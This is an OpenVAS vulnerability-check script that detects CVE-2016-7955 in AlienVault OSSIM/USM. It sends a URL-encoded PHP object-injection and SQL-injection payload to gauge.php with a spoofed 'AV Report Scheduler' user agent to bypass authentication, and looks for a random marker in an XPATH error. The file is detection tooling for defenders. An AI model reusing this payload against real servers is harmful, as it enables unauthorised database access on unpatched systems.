###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_alienvault_ossim_usm_mult_vuln.nasl 12986 2019-01-09 07:58:52Z cfischer $
#
# AlienVault OSSIM/USM Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106617");
  script_version("$Revision: 12986 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-09 08:58:52 +0100 (Wed, 09 Jan 2019) $");
  script_tag(name:"creation_date", value:"2017-02-23 09:39:34 +0700 (Thu, 23 Feb 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2016-7955");
  script_name("AlienVault OSSIM/USM Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_ossim_web_detect.nasl");
  script_mandatory_keys("OSSIM/installed");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/41424/");
  script_xref(name:"URL", value:"https://pentest.blog/unexpected-journey-into-the-alienvault-ossimusm-during-engagement/");

  script_tag(name:"summary", value:"AlienVault OSSIM and USM are prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP request and checks the response.");

  script_tag(name:"insight", value:"Multiple vulnerabilities like object injection, authentication bypass and
  IP spoofing, have been found in AlienVault OSSIM and AlienVault USM.");

  script_tag(name:"solution", value:"Update to 5.3.5 or newer versions.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

cpe_list = make_list("cpe:/a:alienvault:open_source_security_information_management", "cpe:/a:alienvault:unified_security_management");

if (!infos = get_all_app_ports_from_list(cpe_list: cpe_list))
  exit(0);

CPE  = infos['cpe'];
port = infos['port'];

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

rand = rand_str(length: 15, charset:"ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz");

params = 'type=alarm&wtype=foo&asset=ALL_ASSETS&height=1&value=a%3a1%3a%7bs%3a4%3a%22type%22%3bs%3a69%3a%221%20AND%20extractvalue%28rand%28%29%2cconcat%280x3a%2c%28SELECT%20%27' + rand + '%27%29%29%29--%20%22%3b%7d';

url = dir + '/dashboard/sections/widgets/data/gauge.php?' + params;

req = http_get_req(port: port, url: url, user_agent: "AV Report Scheduler");
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && res =~ "XPATH syntax error: '" + rand) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);